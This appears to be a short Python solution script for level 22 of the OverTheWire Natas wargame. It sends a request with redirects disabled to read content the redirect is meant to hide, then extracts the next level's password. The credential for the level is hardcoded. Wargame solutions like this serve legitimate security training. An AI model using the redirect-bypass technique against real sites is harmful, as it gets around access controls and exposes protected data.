#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = "http://%s.natas.labs.overthewire.org/" % username



# req_post = req.get(exp_url+"?submit=1&admin=1",auth=(username,password))
# req.cookies.set('PHPSESSID',req_post.cookies['PHPSESSID'])

req_get = req.get(url+"?revelio=1",auth=(username,password),allow_redirects = False)
# print(req_get.text)
new_password = re.findall("Password: (.*)</pre>",req_get.text)
print(new_password[0])
